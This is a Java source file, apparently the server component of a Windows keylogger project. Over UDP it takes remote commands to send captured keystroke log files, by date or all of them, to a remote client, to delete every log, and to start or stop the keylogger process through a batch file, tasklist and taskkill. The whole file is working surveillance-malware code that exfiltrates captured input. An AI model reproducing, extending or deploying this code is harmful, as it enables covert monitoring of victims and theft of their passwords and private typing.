package com.hao.keylogger.controllers.server;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.StringTokenizer;

import com.hao.keylogger.models.Resources;
import com.hao.keylogger.utils.FileManager;

public class UDPServerHelper {

	private static UDPServerHelper instance;

	private ServerLogController controller;

	private DatagramSocket socket;
	DatagramPacket inPacket;
	private InetAddress hostAddress;
	private String hostName;
	private int hostPort;

	private InetAddress clientAddress;
	private int clientPort;

	private final String PROCESS_TAG = "Processing: ";
	private final String CLIENT_TAG = "Client: ";

	private byte[] buffer = new byte[Resources.SERVER_BUFFER_SIZE];

	Thread listenThread;

	private UDPServerHelper(String hostName, int port) {
		this.hostName = hostName;
		this.hostPort = port;
	}

	public static UDPServerHelper getInstance(String hostName, int port) {
		if (instance == null) {
			instance = new UDPServerHelper(hostName, port);
		}
		return instance;
	}

	public static String getLocalHostIP() {
		try {
			return InetAddress.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return "";
		}
	}

	public boolean startServer() {
		try {
			hostAddress = InetAddress.getByName(hostName);
			socket = new DatagramSocket(hostPort, hostAddress);
			socket.setSoTimeout(Resources.TIME_OUT);
			listenThread = new Thread(new RequestReceiver());
			listenThread.start();
			return true;
		} catch (SocketException | UnknownHostException e) {
			e.printStackTrace();
			return false;
		}

	}

	public boolean stopServer() {
		try {
			socket.close();
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	public void setController(ServerLogController controller) {
		this.controller = controller;
	}

	private class RequestReceiver implements Runnable {
		StringTokenizer stringTokenizer;

		@Override
		public void run() {
			inPacket = new DatagramPacket(buffer, buffer.length);
			while (true) {

				try {
					socket.receive(inPacket);
					clientAddress = inPacket.getAddress();
					clientPort = inPacket.getPort();

					String requestMsg = new String(inPacket.getData(), 0, inPacket.getLength());
					controller.appendToMonitory(CLIENT_TAG + requestMsg);

					stringTokenizer = new StringTokenizer(requestMsg, "?");
					String requestType = stringTokenizer.nextToken();

					switch (requestType) {
					case Resources.FETCH_LOG_REQUEST:
						String dateStr = stringTokenizer.nextToken();

						// format name of log files: d-M-yyyy.txt
						SimpleDateFormat sdf = new SimpleDateFormat("d-M-yyyy");
						Date dateOfLog = sdf.parse(dateStr);
						controller.appendToMonitory(PROCESS_TAG + "get log on the day " + dateOfLog.toString());
						getLogAndSend(dateOfLog);
						break;
					case Resources.FETCH_ALL_LOG_REQUEST:
						getAllLogsAndSend();
						break;
					case Resources.DELETE_ALL_HOST_LOGS:
						deleteAllHostLogs();
						break;
					case Resources.STOP_LOGGER:
						stopLogger();
						break;
					case Resources.START_LOGGER:
						startLogger();
						break;
					default:
						break;
					}

				} catch (Exception e) {

				}
			}
		}

		private void startLogger() {			
			// check if key logger is running
			String line;
			String pidInfo = "";

			Process p;
			try {
				p = Runtime.getRuntime().exec(System.getenv("windir") + "//system32//" + "tasklist.exe");

				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

				while ((line = input.readLine()) != null) {
					pidInfo += line;
				}

				input.close();
			} catch (IOException e) {
				e.printStackTrace();
			}

			if (pidInfo.contains(Resources.KEY_LOGGER_NAME)) {
				sendMessageToClient(Resources.START_LOGGER + "?true?Logger started!");
				return;
			}
			
			// if key logger is not running
			
			try {
				String programPath = new File(Resources.KEY_LOGGER_PATH).getAbsolutePath();
				Runtime.getRuntime().exec(Resources.START_LOGGER_BATCH_FILE_NAME);
			} catch (Exception e) {
				e.printStackTrace();
				sendMessageToClient(Resources.START_LOGGER + "?false?Can not start logger!");
			}
			sendMessageToClient(Resources.START_LOGGER + "?true?Logger started!");
		}

		private void stopLogger() {
			try {
				Runtime.getRuntime().exec("taskkill /F /IM " + Resources.KEY_LOGGER_NAME);
			} catch (IOException e) {
				e.printStackTrace();
				sendMessageToClient(Resources.STOP_LOGGER + "?false?Can not stop logger!");
			}
			sendMessageToClient(Resources.STOP_LOGGER + "?true?Logger is stopped!");
		}

		private void deleteAllHostLogs() {
			File logFolder = new File(Resources.LOGS_DIRECTORY);
			for (File f : logFolder.listFiles()) {
				try {
					f.delete();
				} catch (Exception e) {
					sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?false?Can not delete all log files!");
				}
			}
			sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?true?All logs are deleted!");
		}

		private void getAllLogsAndSend() {
			File logFolder = new File(Resources.LOGS_DIRECTORY);
			File[] files = logFolder.listFiles();

			String numOfLogs = files.length + "";
			sendMessageToClient(numOfLogs);

			for (File f : logFolder.listFiles()) {
				readFileAndSend(f.getPath());
			}
		}

		private void getLogAndSend(Date date) {
			// generate log file name
			String dateStr = new SimpleDateFormat("d-M-yyyy").format(date);
			String logFilePath = Resources.LOGS_DIRECTORY + File.separator + dateStr + Resources.LOG_FILE_EXTENSION;
			int numOfLogs = 1;
			File file = new File(logFilePath);
			if (!file.exists()) {
				numOfLogs = 0;
			}
			sendMessageToClient(numOfLogs + "");
			if (numOfLogs > 0) {
				readFileAndSend(logFilePath);
			}
		}

		private void readFileAndSend(String logFilePath) {
			FileManager fm = new FileManager(logFilePath);
			StringTokenizer strTokenizer = new StringTokenizer(fm.getFileName(), ".");
			String dateOfLogStr = strTokenizer.nextToken();

			try {
				String logContent = fm.readAll();
				sendMessageToClient(dateOfLogStr);
				sendMessageToClient(logContent);
			} catch (IOException e1) {
				controller.appendToMonitory(PROCESS_TAG + "Log not found");
				// sendMessage(address, port, "Log not found!");
			}
		}

		private void sendMessageToClient(String msg) {
			DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), clientAddress, clientPort);
			try {
				socket.send(outPacket);
			} catch (IOException e) {
				controller.appendToMonitory(PROCESS_TAG + "Can not send packet");
			}
		}
	}

}
